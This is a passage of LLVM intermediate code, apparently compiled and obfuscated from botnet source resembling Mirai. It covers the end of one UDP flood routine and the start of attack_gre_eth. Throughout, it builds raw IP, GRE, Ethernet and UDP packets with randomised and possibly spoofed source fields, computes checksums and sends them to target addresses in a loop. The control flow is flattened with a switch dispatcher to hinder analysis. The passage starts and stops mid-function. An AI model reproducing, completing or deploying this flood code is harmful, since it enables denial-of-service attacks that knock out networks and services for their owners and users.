  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i64 1
  %274 = bitcast %struct.udphdr* %273 to i8*
  store i8* %274, i8** %31, align 8
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 2
  %280 = load i8, i8* %279, align 4
  %281 = zext i8 %280 to i32
  %282 = icmp slt i32 %281, 32
  %283 = select i1 %282, i32 1573392413, i32 -907764176
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #7
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #7
  %303 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  store i32 -907764176, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %21, align 4
  %307 = icmp eq i32 %306, -1
  %308 = select i1 %307, i32 -1346475826, i32 -1365749353
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = call i32 @rand_next()
  %311 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 8
  store i32 %310, i32* %312, align 4
  store i32 -1365749353, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i16, i16* %13, align 2
  %315 = zext i16 %314 to i32
  %316 = icmp eq i32 %315, 65535
  %317 = select i1 %316, i32 1494986150, i32 -1341725069
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  store i16 %321, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 3
  %326 = load i16, i16* %325, align 4
  %327 = zext i16 %326 to i32
  %328 = sub nsw i32 %327, 1000
  %329 = xor i32 %328, -1
  %330 = trunc i32 %329 to i16
  %331 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  store i16 %330, i16* %332, align 4
  store i32 -1341725069, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %16, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 -1484096303, i32 164636092
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
  %342 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 0
  store i16 %341, i16* %343, align 2
  store i32 164636092, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i16, i16* %17, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  %348 = select i1 %347, i32 890794378, i32 1426904814
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = call i32 @rand_next()
  %351 = and i32 %350, 65535
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 1
  store i16 %352, i16* %354, align 2
  store i32 1426904814, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8, i8* %20, align 1
  %357 = icmp ne i8 %356, 0
  %358 = select i1 %357, i32 -539473659, i32 -2117750045
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = call i32 @rand_next()
  %361 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 9
  store i32 %360, i32* %362, align 4
  store i32 149177740, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 9
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 9
  store i32 %366, i32* %368, align 4
  store i32 149177740, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8, i8* %19, align 1
  %371 = icmp ne i8 %370, 0
  %372 = select i1 %371, i32 1164950364, i32 652587879
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8*, i8** %31, align 8
  %375 = load i32, i32* %18, align 4
  call void @rand_str(i8* %374, i32 %375)
  store i32 652587879, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 7
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %380 = bitcast %struct.iphdr* %379 to i16*
  %381 = call zeroext i16 @checksum_generic(i16* %380, i32 20)
  %382 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 %381, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 7
  store i16 0, i16* %385, align 2
  %386 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %387 = bitcast %struct.iphdr* %386 to i16*
  %388 = call zeroext i16 @checksum_generic(i16* %387, i32 20)
  %389 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 7
  store i16 %388, i16* %390, align 2
  %391 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %392 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %391, i32 0, i32 3
  store i16 0, i16* %392, align 2
  %393 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %394 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %395 = bitcast %struct.udphdr* %394 to i8*
  %396 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 2
  %398 = load i16, i16* %397, align 2
  %399 = load i32, i32* %18, align 4
  %400 = sext i32 %399 to i64
  %401 = add i64 8, %400
  %402 = trunc i64 %401 to i32
  %403 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %393, i8* %395, i16 zeroext %398, i32 %402)
  %404 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 2
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 0
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %410, i32 0, i32 0
  store i16 2, i16* %411, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  %414 = load i32, i32* %413, align 4
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 2
  %421 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %420, i32 0, i32 0
  store i32 %414, i32* %421, align 4
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 0
  %427 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %426, i32 0, i32 1
  store i16 0, i16* %427, align 2
  %428 = load i32, i32* %10, align 4
  %429 = load i8*, i8** %26, align 8
  %430 = load i32, i32* %18, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 52, %431
  %433 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %434 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %435 = load i32, i32* %9, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = bitcast %struct.sockaddr_in* %438 to %struct.sockaddr*
  store %struct.sockaddr* %439, %struct.sockaddr** %433, align 8
  %440 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %441 = load %struct.sockaddr*, %struct.sockaddr** %440, align 8
  %442 = call i64 @sendto(i32 %428, i8* %429, i64 %432, i32 16384, %struct.sockaddr* %441, i32 16)
  store i32 -1131347947, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i32, i32* %9, align 4
  %445 = add nsw i32 %444, 1
  store i32 %445, i32* %9, align 4
  store i32 1330538881, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  store i32 -1984958055, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %446, %443, %376, %373, %369, %363, %359, %355, %349, %344, %338, %333, %318, %313, %309, %305, %284, %255, %249, %248, %247, %244, %228, %220, %214, %205, %201, %151, %147, %96, %90, %89, %86, %80, %79, %first, %switchDefault
  br label %loopEntry
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 512417063, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 512417063, label %first
    i32 1929964163, label %87
    i32 -529853793, label %88
    i32 -1252647616, label %94
    i32 -336622269, label %97
    i32 1363190281, label %98
    i32 -1711755882, label %104
    i32 -555365147, label %158
    i32 255678272, label %162
    i32 1154760034, label %215
    i32 1476529248, label %219
    i32 714471584, label %228
    i32 914243907, label %234
    i32 -649977396, label %242
    i32 -1091871458, label %258
    i32 15542781, label %261
    i32 1573578041, label %262
    i32 1135147548, label %263
    i32 -1899381703, label %269
    i32 1569508764, label %301
    i32 -1802012629, label %322
    i32 1127213688, label %326
    i32 1391672313, label %330
    i32 -1662778994, label %335
    i32 -1366397109, label %350
    i32 499252819, label %355
    i32 -886940769, label %361
    i32 439238439, label %366
    i32 1899461192, label %372
    i32 1317206116, label %376
    i32 -2060381370, label %380
    i32 -816947911, label %386
    i32 -78913802, label %412
    i32 -1500436890, label %415
    i32 1193945251, label %482
    i32 -1083616486, label %485
    i32 447950187, label %486
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %85 = icmp eq i32 %.reload, -1
  %86 = select i1 %85, i32 1929964163, i32 -529853793
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 447950187, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %89 = load i32, i32* %10, align 4
  %90 = bitcast i32* %9 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  %93 = select i1 %92, i32 -1252647616, i32 -336622269
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %10, align 4
  %96 = call i32 @close(i32 %95)
  store i32 447950187, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1363190281, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %9, align 4
  %100 = load i8, i8* %5, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = select i1 %102, i32 -1711755882, i32 15542781
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %106 = load i8**, i8*** %11, align 8
  %107 = load i32, i32* %9, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %11, align 8
  %111 = load i32, i32* %9, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %22, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %23, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.ethhdr*
  store %struct.ethhdr* %121, %struct.ethhdr** %24, align 8
  %122 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %123 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %122, i64 1
  %124 = bitcast %struct.ethhdr* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %25, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %26, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, 15
  %132 = or i8 %131, 64
  store i8 %132, i8* %129, align 4
  %133 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, -16
  %137 = or i8 %136, 5
  store i8 %137, i8* %134, align 4
  %138 = load i8, i8* %12, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 1
  store i8 %138, i8* %140, align 1
  %141 = load i32, i32* %18, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 66, %142
  %144 = trunc i64 %143 to i16
  %145 = call zeroext i16 @htons(i16 zeroext %144) #7
  %146 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i32 0, i32 2
  store i16 %145, i16* %147, align 2
  %148 = load i16, i16* %13, align 2
  %149 = call zeroext i16 @htons(i16 zeroext %148) #7
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 3
  store i16 %149, i16* %151, align 4
  %152 = load i8, i8* %14, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 5
  store i8 %152, i8* %154, align 4
  %155 = load i8, i8* %15, align 1
  %156 = icmp ne i8 %155, 0
  %157 = select i1 %156, i32 -555365147, i32 255678272
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 4
  store i16 %159, i16* %161, align 2
  store i32 255678272, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 6
  store i8 47, i8* %164, align 1
  %165 = load i32, i32* %21, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 8
  store i32 %165, i32* %167, align 4
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 9
  store i32 %173, i32* %175, align 4
  %176 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %177 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %178 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %177, i32 0, i32 1
  store i16 %176, i16* %178, align 2
  %179 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %180 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %181 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = load i8, i8* %183, align 4
  %185 = and i8 %184, 15
  %186 = or i8 %185, 64
  store i8 %186, i8* %183, align 4
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = bitcast %struct.iphdr* %187 to i8*
  %189 = load i8, i8* %188, align 4
  %190 = and i8 %189, -16
  %191 = or i8 %190, 5
  store i8 %191, i8* %188, align 4
  %192 = load i8, i8* %12, align 1
  %193 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 1
  store i8 %192, i8* %194, align 1
  %195 = load i32, i32* %18, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 28, %196
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %13, align 2
  %203 = zext i16 %202 to i32
  %204 = xor i32 %203, -1
  %205 = trunc i32 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 3
  store i16 %206, i16* %208, align 4
  %209 = load i8, i8* %14, align 1
  %210 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 5
  store i8 %209, i8* %211, align 4
  %212 = load i8, i8* %15, align 1
  %213 = icmp ne i8 %212, 0
  %214 = select i1 %213, i32 1154760034, i32 1476529248
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 4
  store i16 %216, i16* %218, align 2
  store i32 1476529248, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 6
  store i8 17, i8* %221, align 1
  %222 = call i32 @rand_next()
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  store i32 %222, i32* %224, align 4
  %225 = load i8, i8* %20, align 1
  %226 = icmp ne i8 %225, 0
  %227 = select i1 %226, i32 714471584, i32 914243907
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 9
  %231 = load i32, i32* %230, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  store i32 %231, i32* %233, align 4
  store i32 -649977396, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 8
  %237 = load i32, i32* %236, align 4
  %238 = sub i32 %237, 1024
  %239 = xor i32 %238, -1
  %240 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  store i32 -649977396, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i16, i16* %16, align 2
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 0
  store i16 %244, i16* %246, align 2
  %247 = load i16, i16* %17, align 2
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 1
  store i16 %248, i16* %250, align 2
  %251 = load i32, i32* %18, align 4
  %252 = sext i32 %251 to i64
  %253 = add i64 8, %252
  %254 = trunc i64 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load %struct.udphdr*, %struct.udphdr** %26, align 8
